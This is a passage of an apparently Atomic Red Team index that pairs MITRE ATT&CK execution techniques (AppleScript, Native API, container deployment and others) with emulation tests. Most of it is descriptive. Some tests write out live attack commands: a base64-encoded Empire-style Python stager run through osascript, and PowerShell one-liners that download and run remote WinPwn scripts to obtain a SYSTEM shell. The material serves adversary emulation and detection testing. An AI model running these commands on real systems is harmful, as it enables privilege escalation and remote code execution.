      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1059.002
    atomic_tests:
    - name: AppleScript
      auto_generated_guid: 3600d97d-81b9-4171-ab96-e4386506e2c2
      description: "Shell Script with AppleScript. The encoded python script will
        perform an HTTP GET request to 127.0.0.1:80 with a session cookie of \"t3VhVOs/DyCcDTFzIKanRxkvk3I=\",
        unless 'Little Snitch' is installed, in which case it will just exit. \nYou
        can use netcat to listen for the connection and verify execution, e.g. use
        \"nc -l 80\" in another terminal window before executing this test and watch
        for the request.\n\nReference: https://github.com/EmpireProject/Empire\n"
      supported_platforms:
      - macos
      executor:
        command: 'osascript -e "do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings(''ignore'');exec(base64.b64decode(''aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg==''));\\\"
          | python &\""

          '
        name: sh
  T1106:
    technique:
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Gordon Long, Box, Inc., @ethicalhax
      - Stefan Kanthak
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670
      created: '2017-05-31T21:31:17.472Z'
      x_mitre_version: '2.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1106
        url: https://attack.mitre.org/techniques/T1106
      - source_name: MACOS Cocoa
        url: https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/OSX_Technology_Overview/CocoaApplicationLayer/CocoaApplicationLayer.html#//apple_ref/doc/uid/TP40001067-CH274-SW1
        description: Apple. (2015, September 16). Cocoa Application Layer. Retrieved
          June 25, 2020.
      - source_name: Apple Core Services
        url: https://developer.apple.com/documentation/coreservices
        description: Apple. (n.d.). Core Services. Retrieved June 25, 2020.
      - source_name: macOS Foundation
        url: https://developer.apple.com/documentation/foundation
        description: Apple. (n.d.). Foundation. Retrieved July 1, 2020.
      - source_name: OutFlank System Calls
        url: https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
        description: 'de Plaa, C. (2019, June 19). Red Team Tactics: Combining Direct
          System Calls and sRDI to bypass AV/EDR. Retrieved September 29, 2021.'
      - source_name: GNU Fork
        url: https://www.gnu.org/software/libc/manual/html_node/Creating-a-Process.html
        description: Free Software Foundation, Inc.. (2020, June 18). Creating a Process.
          Retrieved June 25, 2020.
      - source_name: CyberBit System Calls
        url: https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/
        description: Gavriel, H. (2018, November 27). Malware Mitigation when Direct
          System Calls are Used. Retrieved September 29, 2021.
      - source_name: GLIBC
        url: https://www.gnu.org/software/libc/
        description: glibc developer community. (2020, February 1). The GNU C Library
          (glibc). Retrieved June 25, 2020.
      - source_name: LIBC
        url: https://man7.org/linux/man-pages//man7/libc.7.html
        description: Kerrisk, M. (2016, December 12). libc(7) — Linux manual page.
          Retrieved June 25, 2020.
      - source_name: Linux Kernel API
        url: https://www.kernel.org/doc/html/v4.12/core-api/kernel-api.html
        description: Linux Kernel Organization, Inc. (n.d.). The Linux Kernel API.
          Retrieved June 25, 2020.
      - source_name: MDSec System Calls
        url: https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/
        description: MDSec Research. (2020, December). Bypassing User-Mode Hooks and
          Direct Invocation of System Calls for Red Teams. Retrieved September 29,
          2021.
      - source_name: Microsoft CreateProcess
        url: http://msdn.microsoft.com/en-us/library/ms682425
        description: Microsoft. (n.d.). CreateProcess function. Retrieved December
          5, 2014.
      - source_name: Microsoft Win32
        url: https://docs.microsoft.com/en-us/windows/win32/api/
        description: Microsoft. (n.d.). Programming reference for the Win32 API. Retrieved
          March 15, 2020.
      - source_name: Microsoft NET
        url: https://dotnet.microsoft.com/learn/dotnet/what-is-dotnet-framework
        description: Microsoft. (n.d.). What is .NET Framework?. Retrieved March 15,
          2020.
      - source_name: NT API Windows
        url: https://undocumented.ntinternals.net/
        description: The NTinterlnals.net team. (n.d.). Nowak, T. Retrieved June 25,
          2020.
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.

        Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)

        Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)

        Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)).
      modified: '2022-04-19T20:30:00.118Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Native API
      x_mitre_detection: "Monitoring API calls may generate a significant amount of
        data and may not be useful for defense unless collected under specific circumstances,
        since benign use of API functions are common and may be difficult to distinguish
        from malicious behavior. Correlation of other events with behavior surrounding
        API function calls using API monitoring will provide additional context to
        an event that may assist in determining if it is due to malicious behavior.
        Correlation of activity by process lineage by process ID may be sufficient.
        \n\nUtilization of the Windows APIs may involve processes loading/accessing
        system DLLs associated with providing called functions (ex: ntdll.dll, kernel32.dll,
        advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially
        to abnormal/unusual or potentially malicious processes, may indicate abuse
        of the Windows API. Though noisy, this data can be combined with other indicators
        to identify adversary activity. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Module: Module Load'
      - 'Process: OS API Execution'
      x_mitre_remote_support: false
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1106
    atomic_tests:
    - name: Execution through API - CreateProcess
      auto_generated_guid: 99be2089-c52d-4a4a-b5c3-261ee42c8b62
      description: Execute program by leveraging Win32 API's. By default, this will
        launch calc.exe from the command prompt.
      supported_platforms:
      - windows
      input_arguments:
        source_file:
          description: Location of the CSharp source file to compile and execute
          type: path
          default: PathToAtomicsFolder\T1106\src\CreateProcess.cs
        output_file:
          description: Location of the payload
          type: path
          default: "%tmp%\\T1106.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: "#{source_file} must exist on system.\n"
        prereq_command: 'if (Test-Path #{source_file}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1106/src/CreateProcess.cs" -OutFile "#{source_file}"
      executor:
        command: |
          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe #{source_file}
          %tmp%/T1106.exe
        name: command_prompt
    - name: WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
      auto_generated_guid: ce4e76e6-de70-4392-9efe-b281fc2b4087
      description: Get SYSTEM shell - Pop System Shell using CreateProcess technique
        via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
        name: powershell
    - name: WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique
      auto_generated_guid: 7ec5b74e-8289-4ff2-a162-b6f286a33abd
      description: Get SYSTEM shell - Bind System Shell using CreateProcess technique
        via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
        name: powershell
    - name: WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation
        technique
      auto_generated_guid: e1f93a06-1649-4f07-89a8-f57279a7d60e
      description: Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation
        technique via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
        name: powershell
  T1153:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--45d84c8b-c1e2-474d-a14d-69b5de0a2bc0
      type: attack-pattern
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1153
        url: https://attack.mitre.org/techniques/T1153
      - source_name: Source Manual
        url: https://ss64.com/bash/source.html
        description: ss64. (n.d.). Source or Dot Operator. Retrieved May 21, 2019.
      modified: '2020-03-30T13:40:14.512Z'
      name: Source
      description: |-
        **This technique has been deprecated and should no longer be used.**

        The <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>.**This technique has been deprecated and should no longer be used.** /path/to/filename [arguments]</code>. Take note of the space after the ".". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.(Citation: Source Manual)

        Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: Monitor for command shell execution of source and subsequent
        processes that are started as a result of being executed by a source command.
        Adversaries must also drop a file to disk in order to execute it with source,
        and these files can also detected by file monitoring.
      x_mitre_deprecated: true
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1152:
    technique:
      x_mitre_platforms:
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--53bfc8bf-8f76-4cd7-8958-49a884ddb3ee
      type: attack-pattern
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1152
        url: https://attack.mitre.org/techniques/T1152
      - url: https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/
        description: Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26).
          Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.
        source_name: Sofacy Komplex Trojan
      modified: '2020-03-10T18:31:00.336Z'
      name: Launchctl
      description: "Launchctl controls the macOS launchd process which handles things
        like launch agents and launch daemons, but can execute other commands or programs
        itself. Launchctl supports taking subcommands on the command-line, interactively,
        or even redirected from standard input. By loading or reloading launch agents
        or launch daemons, adversaries can install persistence or execute changes
        they made  (Citation: Sofacy Komplex Trojan). Running a command from launchctl
        is as simple as <code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute
        \"arg\" \"arg\" \"arg\"</code>. Loading, unloading, or reloading launch agents
        or launch daemons can require elevated privileges. \n\nAdversaries can abuse
        this functionality to execute code or even bypass whitelisting if launchctl
        is an allowed process."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_detection: Knock Knock can be used to detect persistent programs such
        as those installed via launchctl as launch agents or launch daemons. Additionally,
        every launch agent or launch daemon must have a corresponding plist file on
        disk somewhere which can be monitored. Monitor process execution from launchctl/launchd
        for unusual or unknown processes.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Application whitelisting
      - Process whitelisting
      - Whitelisting by file name or path
      x_mitre_permissions_required:
      - User
      - Administrator
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1059.009:
    technique:
      modified: '2023-04-14T18:04:54.607Z'
      name: Cloud API
      description: "Adversaries may abuse cloud APIs to execute malicious commands.
        APIs available in cloud environments provide various functionalities and are
        a feature-rich method for programmatic access to nearly all aspects of a tenant.
        These APIs may be utilized through various methods such as command line interpreters
        (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001)
        modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell),
        or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).
        \ \n\nCloud API functionality may allow for administrative access across all
        major services in a tenant such as compute, storage, identity and access management
        (IAM), networking, and security policies.\n\nWith proper permissions (often
        via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001)
        and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)),
        adversaries may abuse cloud APIs to invoke various functions that execute
        malicious actions. For example, CLI and PowerShell functionality may be accessed
        through binaries installed on cloud-hosted or on-premises hosts or accessed
        through a browser-based cloud shell offered by many cloud platforms (such
        as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment
        to use CLI and/or scripting modules hosted as a container in the cloud environment.
        \ "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_contributors:
      - Ozan Olali
      - Nichols Jasper
      - Jason Sevilla
      - Marcus Weeks
      - Caio Silva
      x_mitre_deprecated: false
      x_mitre_detection: ''
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - IaaS
      - Azure AD
      - Office 365
      - SaaS
      - Google Workspace
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      x_mitre_remote_support: false
      type: attack-pattern
      id: attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf
      created: '2022-03-17T13:28:24.989Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1059/009
        external_id: T1059.009
      - source_name: Microsoft - Azure PowerShell
        description: Microsoft. (2014, December 12). Azure/azure-powershell. Retrieved
          March 24, 2023.
        url: https://github.com/Azure/azure-powershell
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1610:
    technique:
      modified: '2023-04-15T16:13:40.232Z'
      name: Deploy a container
      description: |-
        Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.

        Containers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.(Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_contributors:
      - Pawan Kinger, @kingerpawan, Trend Micro
      - Alfredo Oliveira, Trend Micro
      - Idan Frimark, Cisco
      - Center for Threat-Informed Defense (CTID)
      - Magno Logan, @magnologan, Trend Micro
      - Ariel Shuper, Cisco
      - Vishwas Manral, McAfee
      - Yossi Weizman, Azure Defender Research Team
      x_mitre_deprecated: false
      x_mitre_detection: Monitor for suspicious or unknown container images and pods
        in your environment. Deploy logging agents on Kubernetes nodes and retrieve
        logs from sidecar proxies for application pods to detect malicious activity
        at the cluster level. In Docker, the daemon log provides insight into remote
        API calls, including those that deploy containers. Logs for management services
        or applications used to deploy containers other than the native technologies
        themselves should also be monitored.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Containers
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Pod: Pod Modification'
      - 'Container: Container Creation'
      - 'Pod: Pod Creation'
      - 'Application Log: Application Log Content'
      - 'Container: Container Start'
      x_mitre_remote_support: true
      type: attack-pattern
      id: attack-pattern--56e0d8b8-3e25-49dd-9050-3aa252f5aa92
      created: '2021-03-29T16:51:26.020Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1610
        external_id: T1610
      - source_name: Aqua Build Images on Hosts
        description: 'Assaf Morag. (2020, July 15). Threat Alert: Attackers Building
          Malicious Images on Your Hosts. Retrieved March 29, 2021.'
        url: https://blog.aquasec.com/malicious-container-image-docker-container-host
      - source_name: Docker Containers API
        description: Docker. (n.d.). Docker Engine API v1.41 Reference - Container.
          Retrieved March 29, 2021.
        url: https://docs.docker.com/engine/api/v1.41/#tag/Container
      - source_name: Kubeflow Pipelines
        description: The Kubeflow Authors. (n.d.). Overview of Kubeflow Pipelines.
          Retrieved March 29, 2021.
        url: https://www.kubeflow.org/docs/components/pipelines/overview/pipelines-overview/
      - source_name: Kubernetes Dashboard
        description: The Kubernetes Authors. (n.d.). Kubernetes Web UI (Dashboard).
          Retrieved March 29, 2021.
        url: https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1610
    atomic_tests:
    - name: Deploy Docker container
      auto_generated_guid: 59aa6f26-7620-417e-9318-589e0fb7a372
      description: "Adversaries may deploy containers based on retrieved or built
        malicious images or from benign images that download and execute malicious
        payloads at runtime. They can do this using docker create and docker start
        commands. Kinsing & Doki was exploited using this technique. \n"
      supported_platforms:
      - containers
      dependency_executor_name: sh
      dependencies:
      - description: Verify docker is installed.
        prereq_command: 'which docker

          '
        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
          echo "Docker installed"; fi

          '
      - description: Verify docker service is running.
        prereq_command: 'sudo systemctl status docker  --no-pager

          '
        get_prereq_command: 'sudo systemctl start docker

          '
      executor:
        command: |
          docker build -t t1610 $PathtoAtomicsFolder/T1610/src/
          docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
        name: bash
        cleanup_command: "docker stop t1610_container\ndocker rmi -f t1610:latest
          \n"
  T1155:
    technique:
      x_mitre_platforms:
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--5ad95aaa-49c1-4784-821d-2e83f47b079b
      type: attack-pattern
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1155
        url: https://attack.mitre.org/techniques/T1155
      - url: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/macro-malware-targets-macs/
        description: Yerko Grbic. (2017, February 14). Macro Malware Targets Macs.
          Retrieved July 8, 2017.
        source_name: Macro Malware Targets Macs
      modified: '2020-04-14T13:26:00.846Z'
      name: AppleScript
      description: "macOS and OS X applications send AppleEvent messages to each other
        for interprocess communications (IPC). These messages can be easily scripted
        with AppleScript for local or remote IPC. Osascript executes AppleScript and
        any other Open Scripting Architecture (OSA) language scripts. A list of OSA
        languages installed on a system can be found by using the <code>osalang</code>
        program.\nAppleEvent messages can be sent independently or as part of a script.
        These events can locate open windows, send keystrokes, and interact with almost
        any open application locally or remotely. \n\nAdversaries can use this to
        interact with open SSH connection, move to remote machines, and even present
        users with fake dialog boxes. These events cannot start applications remotely
        (they can start them locally though), but can interact with applications if
        they're already running remotely. Since this is a scripting language, it can
        be used to launch more common techniques as well such as a reverse shell via
        python  (Citation: Macro Malware Targets Macs). Scripts can be run from the
        command-line via <code>osascript /path/to/script</code> or <code>osascript
        -e \"script here\"</code>."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: Monitor for execution of AppleScript through osascript that
        may be related to other suspicious behavior occurring on the system.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1085:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ricardo Dias
      - Casey Smith
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5
      type: attack-pattern
      created: '2017-05-31T21:31:06.045Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1085
        url: https://attack.mitre.org/techniques/T1085
      - source_name: Trend Micro CPL
        description: Merces, F. (2014). CPL Malware Malicious Control Panel Items.
          Retrieved November 1, 2017.
        url: https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf
      - source_name: This is Security Command Line Confusion
        description: B. Ancel. (2014, August 20). Poweliks – Command Line Confusion.
          Retrieved March 5, 2018.
        url: https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/
      modified: '2020-01-31T19:01:41.919Z'
      name: Rundll32
      description: |-
        The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

        Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

        Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: Use process monitoring to monitor the execution and arguments
        of rundll32.exe. Compare recent invocations of rundll32.exe with prior history
        of known good arguments and loaded DLLs to determine anomalous and potentially
        adversarial activity. Command arguments used with the rundll32.exe invocation
        may also be useful in determining the origin and purpose of the DLL being
        loaded.
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Anti-virus
      - Application whitelisting
      - Digital Certificate Validation
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1053.001:
    technique:
      x_mitre_platforms:
      - Linux
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--6636bc83-0611-45a6-b74f-1f3daf635b8e
      created: '2019-12-03T12:59:36.749Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1053.001
        url: https://attack.mitre.org/techniques/T1053/001
      - source_name: rowland linux at 2019
        url: https://www.linkedin.com/pulse/getting-attacker-ip-address-from-malicious-linux-job-craig-rowland/
        description: Craig Rowland. (2019, July 25). Getting an Attacker IP Address
          from a Malicious Linux At Job. Retrieved October 15, 2021.
      - source_name: GTFObins at
        url: https://gtfobins.github.io/gtfobins/at/
        description: Emilio Pinna, Andrea Cardaci. (n.d.). gtfobins at. Retrieved
          September 28, 2021.
      - source_name: Kifarunix - Task Scheduling in Linux
        url: https://kifarunix.com/scheduling-tasks-using-at-command-in-linux/
        description: Koromicha. (2019, September 7). Scheduling tasks using at command
          in Linux. Retrieved December 3, 2019.
      x_mitre_deprecated: false
      revoked: true
      description: |-
        Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial, recurring, or future execution of malicious code. The [at](https://attack.mitre.org/software/S0110) command within Linux operating systems enables administrators to schedule tasks.(Citation: Kifarunix - Task Scheduling in Linux)

        An adversary may use [at](https://attack.mitre.org/software/S0110) in Linux environments to execute programs at system startup or on a scheduled basis for persistence. [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.

        Adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)
      modified: '2022-04-16T20:45:01.814Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: At (Linux)
      x_mitre_detection: "Monitor scheduled task creation using command-line invocation.
        Legitimate scheduled tasks may be created during installation of new software
        or through system administration functions. Look for changes to tasks that
        do not correlate with known software, patch cycles, etc. \n\nReview all jobs
        using the <code>atq</code> command and ensure IP addresses stored in the <code>SSH_CONNECTION</code>
        and <code>SSH_CLIENT</code> variables, machines that created the jobs, are
        trusted hosts. All [at](https://attack.mitre.org/software/S0110) jobs are
        stored in <code>/var/spool/cron/atjobs/</code>.(Citation: rowland linux at
        2019)\n\nSuspicious program execution through scheduled tasks may show up
        as outlier processes that have not been seen before when compared against
        historical data. Data and events should not be viewed in isolation, but as
        part of a chain of behavior that could lead to other activities, such as network
        connections made for Command and Control, learning details about the environment
        through Discovery, and Lateral Movement."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      x_mitre_is_subtechnique: true
      x_mitre_remote_support: true
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1117:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Casey Smith
      object_marking_refs:
